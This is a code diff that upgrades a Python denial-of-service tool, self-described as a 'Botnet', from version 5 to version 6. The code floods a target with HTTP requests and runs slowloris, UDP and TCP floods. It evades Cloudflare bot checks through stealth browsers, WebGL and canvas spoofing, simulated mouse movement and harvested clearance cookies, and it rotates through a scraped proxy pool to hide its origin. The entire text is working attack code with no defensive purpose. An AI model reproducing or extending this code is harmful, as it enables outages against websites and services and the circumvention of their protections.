@@ -20,15 +20,20 @@ from requests.cookies import RequestsCookieJar
 import cloudscraper
 import subprocess
 import math
+import urllib.parse
+import sys
+from selenium_stealth import stealth
+from selenium.webdriver.common.by import By
+from selenium.webdriver.chrome.options import Options
 
 # Logging Setup
 logging.basicConfig(
     level=logging.INFO,
     format="%(asctime)s - [%(levelname)s] %(message)s",
-    handlers=[logging.FileHandler("chaos_obliterator_v5.log"), logging.StreamHandler()]
+    handlers=[logging.FileHandler("chaos_obliterator_v6.log"), logging.StreamHandler()]
 )
 
-class ChaosObliteratorV5:
+class ChaosObliteratorV6:
     def __init__(self, target_l7: str = None, target_l4: str = None, duration: int = 60, threads: int = 30, methods: List[str] = None, proxy: str = None):
         self.target_l7 = target_l7.replace("https://", "").replace("http://", "").replace("www.", "").split("/")[0] if target_l7 else None
         self.target_l4 = target_l4 if target_l4 else None
@@ -37,7 +42,7 @@ class ChaosObliteratorV5:
         self.methods = methods if methods else ["chaoshttp", "ghostloris", "udpchaos", "tcpobliterator"]
         self.end_time = time.time() + duration
         self.user_agents = [
-            f"Mozilla/5.0 (Windows NT {random.uniform(12.0, 18.0):.1f}; Win64; x64) AppleWebKit/537.{random.randint(80, 90)} (KHTML, like Gecko) Chrome/{random.randint(122, 124)}.0.0.0 Safari/537.{random.randint(80, 90)}",
+            f"Mozilla/5.0 (Windows NT {random.uniform(12.0, 18.0):.1f}; Win64; x64) AppleWebKit/537.{random.randint(80, 90)} (KHTML, like Gecko) Chrome/{random.randint(124, 126)}.0.0.0 Safari/537.{random.randint(80, 90)}",
             f"Mozilla/5.0 (iPhone; CPU iPhone OS {random.randint(16, 20)}_0 like Mac OS X) AppleWebKit/605.1.{random.randint(40, 50)} (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
         ]
         self.success_count = {m: 0 for m in self.methods}
@@ -49,8 +54,19 @@ class ChaosObliteratorV5:
         self.session_headers = {}  # Store headers from browser
         self.cookie_file = "cookies.json"  # Store cookies for debugging
         self.screenshot_dir = "screenshots"  # Store screenshots for debugging
-        self.proxy = proxy  # Proxy support (http:// or socks5://)
+        self.proxy = proxy  # Single proxy
+        self.proxy_pool = self._get_proxy_pool()  # Dynamic proxy pool
         os.makedirs(self.screenshot_dir, exist_ok=True)
+
+    def _get_proxy_pool(self) -> List[str]:
+        """Fetch proxy pool from proxyscrape API."""
+        try:
+            response = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http,socks5&timeout=1000&country=all&ssl=all&anonymity=all")
+            proxies = response.text.splitlines()
+            return [p for p in proxies if p]
+        except:
+            logging.warning("Failed to fetch proxy pool, using provided proxy or None.")
+            return [self.proxy] if self.proxy else [None]
 
     def _random_payload(self, size: int = 512) -> bytes:
         """Upgraded polymorphic payload with larger size."""
@@ -63,7 +79,7 @@ class ChaosObliteratorV5:
 
     def _random_path(self) -> str:
         """Dynamic obfuscated URL paths."""
-        prefixes = ["v13", "chaos", "obliterator", "nexus", "vortex"]
+        prefixes = ["v14", "chaos", "obliterator", "nexus", "vortex"]
         segments = [''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(45, 60))) for _ in range(random.randint(12, 15))]
         query = f"?matrix={''.join(random.choices(string.hexdigits.lower(), k=52))}&epoch={random.randint(100000000000000, 999999999999999)}"
         return f"/{random.choice(prefixes)}/{'/'.join(segments)}{query}"
@@ -80,11 +96,11 @@ class ChaosObliteratorV5:
             "Accept": random.choice(["application/json", "text/event-stream", "*/*", "application/x-graphql"]),
             "Cache-Control": "no-cache, no-store, must-revalidate",
             "Connection": "keep-alive",
-            "Sec-Ch-Ua": f'"Google Chrome";v="{random.randint(122, 124)}", "Not;A=Brand";v="8", "Chromium";v="{random.randint(122, 124)}"',
+            "Sec-Ch-Ua": f'"Google Chrome";v="{random.randint(124, 126)}", "Not;A=Brand";v="8", "Chromium";v="{random.randint(124, 126)}"',
             "Sec-Ch-Ua-Mobile": "?0",
             "Sec-Ch-Ua-Platform": '"Windows"'
         }
-        headers.update(self.session_headers)  # Inject headers from browser
+        headers.update(self.session_headers)
         if random.random() < 0.99:
             headers["X-Entropy-Nexus"] = ''.join(random.choices(string.hexdigits.lower(), k=60))
         return headers
@@ -110,11 +126,9 @@ class ChaosObliteratorV5:
             {"width": 1366, "height": 768},
             {"width": 1440, "height": 900}
         ]
-        proxies = [self.proxy] if self.proxy else [None]
         while attempt < max_attempts:
-            proxy = random.choice(proxies)
+            proxy = random.choice(self.proxy_pool)
             try:
-                # Use Xvfb if available
                 cmd = ["xvfb-run", "--auto-servernum", "python3", "-c", "import playwright"]
                 if os.system("command -v xvfb-run > /dev/null") == 0:
                     subprocess.run(cmd, check=True, capture_output=True)
@@ -128,21 +142,58 @@ class ChaosObliteratorV5:
                     )
                     page = context.new_page()
                     
+                    # Inject canvas/WebGL spoofing
+                    page.evaluate("""
+                        () => {
+                            const getContext = HTMLCanvasElement.prototype.getContext;
+                            HTMLCanvasElement.prototype.getContext = function(contextType, attributes) {
+                                if (contextType === 'webgl' || contextType === 'webgl2') {
+                                    const gl = getContext.call(this, contextType, attributes);
+                                    const origGetParameter = gl.getParameter;
+                                    gl.getParameter = function(parameter) {
+                                        if (parameter === gl.RENDERER || parameter === gl.VENDOR) {
+                                            return 'WebGL Spoofed';
+                                        }
+                                        return origGetParameter.call(this, parameter);
+                                    };
+                                    return gl;
+                                }
+                                return getContext.call(this, contextType, attributes);
+                            };
+                        }
+                    """)
+                    
                     # Advanced human behavior emulation
                     page.goto(f"https://{self.target_l7}", wait_until="domcontentloaded", timeout=30000)
                     time.sleep(random.uniform(1, 3))
-                    page.evaluate("window.scrollTo(0, document.body.scrollHeight)")  # Scroll
-                    time.sleep(random.uniform(0.5, 1.5))
                     
-                    # Simulate mouse trajectory
+                    # Gradual scroll
                     for _ in range(3):
+                        page.evaluate("window.scrollBy(0, document.body.scrollHeight * 0.2)")
+                        time.sleep(random.uniform(0.3, 0.7))
+                    
+                    # Simulate Bezier curve mouse movement
+                    for _ in range(4):
                         x_start = random.randint(100, 800)
                         y_start = random.randint(100, 600)
                         x_end = random.randint(100, 800)
                         y_end = random.randint(100, 600)
-                        page.mouse.move(x_start, y_start)
-                        page.mouse.move(x_end, y_end, steps=20)  # Smooth movement
-                        time.sleep(random.uniform(0.1, 0.3))
+                        x_control1 = x_start + random.randint(-100, 100)
+                        y_control1 = y_start + random.randint(-100, 100)
+                        x_control2 = x_end + random.randint(-100, 100)
+                        y_control2 = y_end + random.randint(-100, 100)
+                        steps = 30
+                        for t in range(steps + 1):
+                            t = t / steps
+                            x = (1-t)**3 * x_start + 3*(1-t)**2 * t * x_control1 + 3*(1-t) * t**2 * x_control2 + t**3 * x_end
+                            y = (1-t)**3 * y_start + 3*(1-t)**2 * t * y_control1 + 3*(1-t) * t**2 * y_control2 + t**3 * y_end
+                            page.mouse.move(x, y)
+                            time.sleep(random.uniform(0.01, 0.03))
+                    
+                    # Simulate hover
+                    if page.query_selector("a, button"):
+                        page.query_selector("a, button").hover()
+                        time.sleep(random.uniform(0.2, 0.5))
                     
                     page.mouse.click(random.randint(100, 800), random.randint(100, 600))  # Random click
                     time.sleep(random.uniform(0.5, 1.5))
@@ -161,10 +212,11 @@ class ChaosObliteratorV5:
                         browser.close()
                         continue
                     
-                    # Check HTTP status
+                    # Check HTTP status and response body
                     status = page.evaluate("() => window.performance.getEntriesByType('navigation')[0].responseStatus")
+                    response_body = page.content()[:200]  # Log first 200 chars
                     if status in [403, 429]:
-                        logging.warning(f"Attempt {attempt + 1}: HTTP {status} detected.")
+                        logging.warning(f"Attempt {attempt + 1}: HTTP {status} detected. Response: {response_body}")
                         self._save_screenshot(page, attempt + 1)
                         attempt += 1
                         browser.close()
@@ -175,7 +227,19 @@ class ChaosObliteratorV5:
                     cf_clearance = any(cookie["name"] == "cf_clearance" for cookie in cookies)
                     cf_bm = any(cookie["name"] == "__cf_bm" for cookie in cookies)
                     if not (cf_clearance and cf_bm):
-                        logging.warning(f"Attempt {attempt + 1}: Missing cf_clearance or __cf_bm, retrying...")
+                        logging.warning(f"Attempt {attempt + 1}: Missing cf_clearance or __cf_bm, retrying... Response: {response_body}")
+                        self._save_cookies(cookies)
+                        self._save_screenshot(page, attempt + 1)
+                        attempt += 1
+                        browser.close()
+                        continue
+                    
+                    # Validate cookies with test request
+                    test_headers = self._random_headers()
+                    test_headers["Cookie"] = "; ".join([f"{c['name']}={c['value']}" for c in cookies])
+                    test_response = requests.get(f"https://{self.target_l7}", headers=test_headers, proxies={"https": proxy} if proxy else None, timeout=5)
+                    if test_response.status_code != 200:
+                        logging.warning(f"Attempt {attempt + 1}: Cookie validation failed, status {test_response.status_code}. Response: {test_response.text[:200]}")
                         self._save_cookies(cookies)
                         self._save_screenshot(page, attempt + 1)
                         attempt += 1
@@ -210,9 +274,8 @@ class ChaosObliteratorV5:
         """Fallback to undetected_chromedriver with advanced emulation."""
         max_attempts = 3
         attempt = 0
-        proxies = [self.proxy] if self.proxy else [None]
         while attempt < max_attempts:
-            proxy = random.choice(proxies)
+            proxy = random.choice(self.proxy_pool)
             try:
                 options = uc.ChromeOptions()
                 options.add_argument(f"--user-agent={random.choice(self.user_agents)}")
@@ -220,20 +283,62 @@ class ChaosObliteratorV5:
                 if proxy:
                     options.add_argument(f"--proxy-server={proxy}")
                 driver = uc.Chrome(options=options, headless=True, use_subprocess=False)
+                
+                # Canvas/WebGL spoofing
+                driver.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
+                    "source": """
+                        Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
+                        const getContext = HTMLCanvasElement.prototype.getContext;
+                        HTMLCanvasElement.prototype.getContext = function(contextType, attributes) {
+                            if (contextType === 'webgl' || contextType === 'webgl2') {
+                                const gl = getContext.call(this, contextType, attributes);
+                                const origGetParameter = gl.getParameter;
+                                gl.getParameter = function(parameter) {
+                                    if (parameter === gl.RENDERER || parameter === gl.VENDOR) {
+                                        return 'WebGL Spoofed';
+                                    }
+                                    return origGetParameter.call(this, parameter);
+                                };
+                                return gl;
+                            }
+                            return getContext.call(this, contextType, attributes);
+                        };
+                    """
+                })
+                
                 driver.get(f"https://{self.target_l7}")
                 time.sleep(random.uniform(1, 3))
-                driver.execute_script("window.scrollTo(0, document.body.scrollHeight)")  # Scroll
-                time.sleep(random.uniform(0.5, 1.5))
                 
-                # Simulate mouse trajectory
+                # Gradual scroll
                 for _ in range(3):
+                    driver.execute_script("window.scrollBy(0, document.body.scrollHeight * 0.2)")
+                    time.sleep(random.uniform(0.3, 0.7))
+                
+                # Simulate Bezier curve mouse movement
+                for _ in range(4):
                     x_start = random.randint(100, 800)
                     y_start = random.randint(100, 600)
                     x_end = random.randint(100, 800)
                     y_end = random.randint(100, 600)
-                    driver.execute_script(f"document.elementFromPoint({x_start}, {y_start}).dispatchEvent(new MouseEvent('mousemove', {{clientX: {x_start}, clientY: {y_start}}}))")
-                    driver.execute_script(f"document.elementFromPoint({x_end}, {y_end}).dispatchEvent(new MouseEvent('mousemove', {{clientX: {x_end}, clientY: {y_end}}}))")
-                    time.sleep(random.uniform(0.1, 0.3))
+                    x_control1 = x_start + random.randint(-100, 100)
+                    y_control1 = y_start + random.randint(-100, 100)
+                    x_control2 = x_end + random.randint(-100, 100)
+                    y_control2 = y_end + random.randint(-100, 100)
+                    steps = 30
+                    for t in range(steps + 1):
+                        t = t / steps
+                        x = (1-t)**3 * x_start + 3*(1-t)**2 * t * x_control1 + 3*(1-t) * t**2 * x_control2 + t**3 * x_end
+                        y = (1-t)**3 * y_start + 3*(1-t)**2 * t * y_control1 + 3*(1-t) * t**2 * y_control2 + t**3 * y_end
+                        driver.execute_script(f"document.elementFromPoint({x}, {y}).dispatchEvent(new MouseEvent('mousemove', {{clientX: {x}, clientY: {y}}}))")
+                        time.sleep(random.uniform(0.01, 0.03))
+                
+                # Simulate hover
+                try:
+                    element = driver.find_element(By.CSS_SELECTOR, "a, button")
+                    driver.execute_script("arguments[0].dispatchEvent(new MouseEvent('mouseover'))", element)
+                    time.sleep(random.uniform(0.2, 0.5))
+                except:
+                    pass
                 
                 driver.execute_script("document.elementFromPoint(500, 300).click()")  # Random click
                 time.sleep(random.uniform(0.3, 1))
@@ -242,7 +347,7 @@ class ChaosObliteratorV5:
                 
                 # Simulate keyboard input
                 try:
-                    driver.find_element_by_css_selector("input[type='text']").send_keys(''.join(random.choices(string.ascii_letters, k=10)))
+                    driver.find_element(By.CSS_SELECTOR, "input[type='text']").send_keys(''.join(random.choices(string.ascii_letters, k=10)))
                     time.sleep(random.uniform(0.2, 0.5))
                 except:
                     pass
@@ -258,11 +363,21 @@ class ChaosObliteratorV5:
                     driver.quit()
                     continue
                 
+                # Validate cookies with test request
+                test_headers = self._random_headers()
+                test_headers["Cookie"] = "; ".join([f"{c['name']}={c['value']}" for c in cookies])
+                test_response = requests.get(f"https://{self.target_l7}", headers=test_headers, proxies={"https": proxy} if proxy else None, timeout=5)
+                if test_response.status_code != 200:
+                    logging.error(f"Fallback attempt {attempt + 1}: Cookie validation failed, status {test_response.status_code}. Response: {test_response.text[:200]}")
+                    self._save_cookies(cookies)
+                    attempt += 1
+                    driver.quit()
+                    continue
+                
                 # Store cookies in RequestsCookieJar
                 for cookie in cookies:
                     self.cookies.set(cookie["name"], cookie["value"], domain=self.target_l7, path=cookie["path"])
                 
-                # Get headers
                 self.session_headers = {
                     "Cookie": "; ".join([f"{name}={value}" for name, value in self.cookies.items()]),
                     "Sec-Fetch-Site": "same-origin",
@@ -276,18 +391,139 @@ class ChaosObliteratorV5:
             except Exception as e:
                 logging.error(f"Fallback failed: {e}")
                 attempt += 1
+                if attempt == max_attempts:
+                    logging.warning("Switching to selenium-stealth fallback...")
+                    self._get_browser_session_selenium()
         logging.error("Fallback failed after max attempts.")
+
+    def _get_browser_session_selenium(self):
+        """Ultimate fallback using selenium-stealth."""
+        max_attempts = 3
+        attempt = 0
+        while attempt < max_attempts:
+            proxy = random.choice(self.proxy_pool)
+            try:
+                options = Options()
+                options.add_argument(f"--user-agent={random.choice(self.user_agents)}")
+                options.add_argument("--headless")
+                if proxy:
+                    options.add_argument(f"--proxy-server={proxy}")
+                driver = uc.Chrome(options=options, headless=True, use_subprocess=False)
+                stealth(driver,
+                    languages=["en-US", "en"],
+                    vendor="Google Inc.",
+                    platform="Win32",
+                    webgl_vendor="Intel Inc.",
+                    renderer="Intel Iris OpenGL Engine",
+                    fix_hairline=True,
+                )
+                
+                driver.get(f"https://{self.target_l7}")
+                time.sleep(random.uniform(1, 3))
+                
+                # Gradual scroll
+                for _ in range(3):
+                    driver.execute_script("window.scrollBy(0, document.body.scrollHeight * 0.2)")
+                    time.sleep(random.uniform(0.3, 0.7))
+                
+                # Simulate Bezier curve mouse movement
+                for _ in range(4):
+                    x_start = random.randint(100, 800)
+                    y_start = random.randint(100, 600)
+                    x_end = random.randint(100, 800)
+                    y_end = random.randint(100, 600)
+                    x_control1 = x_start + random.randint(-100, 100)
+                    y_control1 = y_start + random.randint(-100, 100)
+                    x_control2 = x_end + random.randint(-100, 100)
+                    y_control2 = y_end + random.randint(-100, 100)
+                    steps = 30
+                    for t in range(steps + 1):
+                        t = t / steps
+                        x = (1-t)**3 * x_start + 3*(1-t)**2 * t * x_control1 + 3*(1-t) * t**2 * x_control2 + t**3 * x_end
+                        y = (1-t)**3 * y_start + 3*(1-t)**2 * t * y_control1 + 3*(1-t) * t**2 * y_control2 + t**3 * y_end
+                        driver.execute_script(f"document.elementFromPoint({x}, {y}).dispatchEvent(new MouseEvent('mousemove', {{clientX: {x}, clientY: {y}}}))")
+                        time.sleep(random.uniform(0.01, 0.03))
+                
+                # Simulate hover
+                try:
+                    element = driver.find_element(By.CSS_SELECTOR, "a, button")
+                    driver.execute_script("arguments[0].dispatchEvent(new MouseEvent('mouseover'))", element)
+                    time.sleep(random.uniform(0.2, 0.5))
+                except:
+                    pass
+                
+                driver.execute_script("document.elementFromPoint(500, 300).click()")  # Random click
+                time.sleep(random.uniform(0.3, 1))
+                driver.execute_script("window.focus()")  # Simulate focus
+                time.sleep(random.uniform(0.2, 0.8))
+                
+                # Simulate keyboard input
+                try:
+                    driver.find_element(By.CSS_SELECTOR, "input[type='text']").send_keys(''.join(random.choices(string.ascii_letters, k=10)))
+                    time.sleep(random.uniform(0.2, 0.5))
+                except:
+                    pass
+                
+                # Get cookies and validate
+                cookies = driver.get_cookies()
+                cf_clearance = any(cookie["name"] == "cf_clearance" for cookie in cookies)
+                cf_bm = any(cookie["name"] == "__cf_bm" for cookie in cookies)
+                if not (cf_clearance and cf_bm):
+                    logging.error(f"Selenium attempt {attempt + 1}: Missing cf_clearance or __cf_bm.")
+                    self._save_cookies(cookies)
+                    attempt += 1
+                    driver.quit()
+                    continue
+                
+                # Validate cookies with test request
+                test_headers = self._random_headers()
+                test_headers["Cookie"] = "; ".join([f"{c['name']}={c['value']}" for c in cookies])
+                test_response = requests.get(f"https://{self.target_l7}", headers=test_headers, proxies={"https": proxy} if proxy else None, timeout=5)
+                if test_response.status_code != 200:
+                    logging.error(f"Selenium attempt {attempt + 1}: Cookie validation failed, status {test_response.status_code}. Response: {test_response.text[:200]}")
+                    self._save_cookies(cookies)
+                    attempt += 1
+                    driver.quit()
+                    continue
+                
+                # Store cookies in RequestsCookieJar
+                for cookie in cookies:
+                    self.cookies.set(cookie["name"], cookie["value"], domain=self.target_l7, path=cookie["path"])
+                
+                self.session_headers = {
+                    "Cookie": "; ".join([f"{name}={value}" for name, value in self.cookies.items()]),
+                    "Sec-Fetch-Site": "same-origin",
+                    "Sec-Fetch-Mode": "navigate",
+                    "Sec-Fetch-Dest": "document"
+                }
+                self._save_cookies(cookies)
+                driver.quit()
+                logging.info("Selenium: JS challenge passed, cookies obtained.")
+                return
+            except Exception as e:
+                logging.error(f"Selenium failed: {e}")
+                attempt += 1
+        logging.error("Selenium failed after max attempts.")
 
     def _get_browser_session_cloudscraper(self):
         """Ultimate fallback using cloudscraper."""
         try:
             scraper = cloudscraper.create_scraper()
-            response = scraper.get(f"https://{self.target_l7}")
+            response = scraper.get(f"https://{self.target_l7}", proxies={"https": random.choice(self.proxy_pool)} if self.proxy_pool else None)
             cookies = response.cookies.get_dict()
             cf_clearance = "cf_clearance" in cookies
             cf_bm = "__cf_bm" in cookies
             if not (cf_clearance and cf_bm):
-                logging.error("Cloudscraper failed: Missing cf_clearance or __cf_bm.")
+                logging.error(f"Cloudscraper failed: Missing cf_clearance or __cf_bm. Response: {response.text[:200]}")
+                self._save_cookies(cookies)
+                return
+            
+            # Validate cookies with test request
+            test_headers = self._random_headers()
+            test_headers["Cookie"] = "; ".join([f"{name}={value}" for name, value in cookies.items()])
+            test_response = requests.get(f"https://{self.target_l7}", headers=test_headers, proxies={"https": random.choice(self.proxy_pool)} if self.proxy_pool else None, timeout=5)
+            if test_response.status_code != 200:
+                logging.error(f"Cloudscraper cookie validation failed, status {test_response.status_code}. Response: {test_response.text[:200]}")
                 self._save_cookies(cookies)
                 return
             
@@ -295,7 +531,6 @@ class ChaosObliteratorV5:
             for name, value in cookies.items():
                 self.cookies.set(name, value, domain=self.target_l7, path="/")
             
-            # Get headers
             self.session_headers = {
                 "Cookie": "; ".join([f"{name}={value}" for name, value in self.cookies.items()]),
                 "Sec-Fetch-Site": "same-origin",
@@ -311,9 +546,15 @@ class ChaosObliteratorV5:
         """Check environment for dependencies."""
         try:
             import playwright
-            logging.info("Playwright detected.")
+            logging.info(f"Playwright detected, version: {playwright.__version__}")
         except ImportError:
             logging.error("Playwright not installed. Run: pip3 install playwright")
+            return False
+        try:
+            import tls_client
+            logging.info(f"tls_client detected, version: {tls_client.__version__}")
+        except ImportError:
+            logging.error("tls_client not installed. Run: pip3 install tls-client")
             return False
         try:
             os.system("playwright install chromium > /dev/null 2>&1")
@@ -330,10 +571,10 @@ class ChaosObliteratorV5:
         return True
 
     def _refresh_cookies(self):
-        """Refresh cookies every 15 seconds."""
+        """Refresh cookies every 10 seconds."""
         while time.time() < self.end_time:
             self._get_browser_session()
-            time.sleep(15)
+            time.sleep(10)
 
     def _scan_ports(self):
         """Dynamic port scanning for L4 targets."""
@@ -367,7 +608,7 @@ class ChaosObliteratorV5:
         if not self.target_l7:
             return
         session = tls_client.Session(
-            client_identifier=f"chrome_{random.randint(122, 124)}",
+            client_identifier=f"chrome_{random.randint(124, 126)}",
             random_tls_extension_order=True
         )
         while time.time() < self.end_time:
@@ -381,9 +622,9 @@ class ChaosObliteratorV5:
                     url = f"https://{self.target_l7}{path}"
                     body = self._random_payload(512) if method in ["POST", "PUT"] else None
                     if method == "GET":
-                        resp = session.get(url, headers=headers, proxy=self.proxy)
+                        resp = session.get(url, headers=headers, proxy=random.choice(self.proxy_pool))
                     else:
-                        resp = session.post(url, headers=headers, data=body, proxy=self.proxy)
+                        resp = session.post(url, headers=headers, data=body, proxy=random.choice(self.proxy_pool))
                     self._adjust_jitter(thread_id, (time.time() - start_time) * 1000)
                     with self.lock:
                         self.success_count["chaoshttp"] += 1 if resp.status_code < 400 else 0
@@ -410,34 +651,41 @@ class ChaosObliteratorV5:
                 time.sleep(self._adjust_jitter(thread_id, (time.time() - start_time) * 1000))
             except Exception as e:
                 logging.debug(f"ChaosHTTP error: {e}")
+            finally:
+                logging.debug(f"ChaosHTTP thread {thread_id} execution time: {(time.time() - start_time) * 1000:.2f} ms")
 
     def _ghostloris(self, thread_id: int):
         """Upgraded L7: Ghost Slowloris with tls_client."""
         if not self.target_l7:
             return
-        session = TLSClient(
-            client_identifier=f"chrome_{random.randint(122, 124)}",
-            random_tls_extension_order=True
-        )
-        while time.time() < self.end_time:
-            start_time = time.time()
-            try:
-                headers = {
-                    "User-Agent": random.choice(self.user_agents),
-                    "X-Forwarded-For": self._random_ip(),
-                    "Connection": "keep-alive"
-                }
-                headers.update(self.session_headers)
-                path = self._random_path()
-                url = f"https://{self.target_l7}{path}"
-                session.get(url, headers=headers, timeout=0.08, proxy=self.proxy)  # Low timeout for slow drip
-                self._adjust_jitter(thread_id, (time.time() - start_time) * 1000)
-                with self.lock:
-                    self.success_count["ghostloris"] += 1
-                    self.response_times["ghostloris"].append((time.time() - start_time) * 1000)
-                time.sleep(self._adjust_jitter(thread_id, (time.time() - start_time) * 1000))
-            except Exception as e:
-                logging.debug(f"GhostLoris error: {e}")
+        try:
+            session = tls_client.Session(
+                client_identifier=f"chrome_{random.randint(124, 126)}",
+                random_tls_extension_order=True
+            )
+            while time.time() < self.end_time:
+                start_time = time.time()
+                try:
+                    headers = {
+                        "User-Agent": random.choice(self.user_agents),
+                        "X-Forwarded-For": self._random_ip(),
+                        "Connection": "keep-alive"
+                    }
+                    headers.update(self.session_headers)
+                    path = self._random_path()
+                    url = f"https://{self.target_l7}{path}"
+                    session.get(url, headers=headers, timeout=0.08, proxy=random.choice(self.proxy_pool))  # Low timeout for slow drip
+                    self._adjust_jitter(thread_id, (time.time() - start_time) * 1000)
+                    with self.lock:
+                        self.success_count["ghostloris"] += 1
+                        self.response_times["ghostloris"].append((time.time() - start_time) * 1000)
+                    time.sleep(self._adjust_jitter(thread_id, (time.time() - start_time) * 1000))
+                except Exception as e:
+                    logging.debug(f"GhostLoris error: {e}")
+                finally:
+                    logging.debug(f"GhostLoris thread {thread_id} execution time: {(time.time() - start_time) * 1000:.2f} ms")
+        except Exception as e:
+            logging.error(f"GhostLoris thread {thread_id} failed to initialize: {e}")
 
     def _udpchaos(self, thread_id: int):
         """L4: UDP chaos with larger payloads."""
@@ -445,6 +693,7 @@ class ChaosObliteratorV5:
             return
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         while time.time() < self.end_time:
+            start_time = time.time()
             try:
                 port = random.choice(self.active_ports)
                 payload = self._random_payload(1024)
@@ -454,6 +703,8 @@ class ChaosObliteratorV5:
                 time.sleep(self._adjust_jitter(thread_id, 0))
             except:
                 pass
+            finally:
+                logging.debug(f"UDPChaos thread {thread_id} execution time: {(time.time() - start_time) * 1000:.2f} ms")
         sock.close()
 
     def _tcpobliterator(self, thread_id: int):
@@ -461,6 +712,7 @@ class ChaosObliteratorV5:
         if not self.target_l4:
             return
         while time.time() < self.end_time:
+            start_time = time.time()
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 sock.settimeout(0.015)
@@ -473,13 +725,15 @@ class ChaosObliteratorV5:
                 time.sleep(self._adjust_jitter(thread_id, 0))
             except:
                 pass
+            finally:
+                logging.debug(f"TCPObliterator thread {thread_id} execution time: {(time.time() - start_time) * 1000:.2f} ms")
 
     def start(self):
         """Unleash the upgraded chaos obliterator."""
         if not self.target_l7 and not self.target_l4:
             logging.error("At least one target (L7 or L4) required")
             return
-        logging.info(f"ChaosObliteratorV5 strike on L7: {self.target_l7 or 'None'}, L4: {self.target_l4 or 'None'}, methods: {self.methods}, proxy: {self.proxy or 'None'}")
+        logging.info(f"ChaosObliteratorV6 strike on L7: {self.target_l7 or 'None'}, L4: {self.target_l4 or 'None'}, methods: {self.methods}, proxy pool: {len(self.proxy_pool)} proxies")
         
         # Check environment
         if not self._check_environment():
@@ -504,25 +758,29 @@ class ChaosObliteratorV5:
             "udpchaos": self._udpchaos,
             "tcpobliterator": self._tcpobliterator
         }
-        for method in self.methods:
-            if method in method_funcs:
-                for i in range(self.threads // len(self.methods)):
-                    t = threading.Thread(target=method_funcs[method], args=(i,), daemon=True)
-                    threads.append(t)
-        for t in threads:
-            t.start()
-        for t in threads:
-            t.join()
-        avg_response = {k: (sum(v)/len(v) if v else 0) for k, v in self.response_times.items()}
-        logging.info(f"Obliteration complete. Success counts: {self.success_count}, Avg response times (ms): {avg_response}")
+        try:
+            for method in self.methods:
+                if method in method_funcs:
+                    for i in range(self.threads // len(self.methods)):
+                        t = threading.Thread(target=method_funcs[method], args=(i,), daemon=True)
+                        threads.append(t)
+            for t in threads:
+                t.start()
+            for t in threads:
+                t.join()
+        except KeyboardInterrupt:
+            logging.info("Received KeyboardInterrupt, shutting down gracefully...")
+        finally:
+            avg_response = {k: (sum(v)/len(v) if v else 0) for k, v in self.response_times.items()}
+            logging.info(f"Obliteration complete. Success counts: {self.success_count}, Avg response times (ms): {avg_response}")
 
 def main(target_l7: str, target_l4: str, duration: int, methods: str, proxy: str):
     methods = methods.split(",")
-    obliterator = ChaosObliteratorV5(target_l7, target_l4, duration, methods=methods, proxy=proxy)
+    obliterator = ChaosObliteratorV6(target_l7, target_l4, duration, methods=methods, proxy=proxy)
     obliterator.start()
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="ChaosObliteratorV5 Botnet")
+    parser = argparse.ArgumentParser(description="ChaosObliteratorV6 Botnet")
     parser.add_argument("target_l7", nargs="?", default=None, help="L7 target URL (e.g., http://httpbin.org)")
     parser.add_argument("target_l4", nargs="?", default=None, help="L4 target IP (e.g., 93.184.216.34)")
     parser.add_argument("--duration", type=int, default=60, help="Duration in seconds")
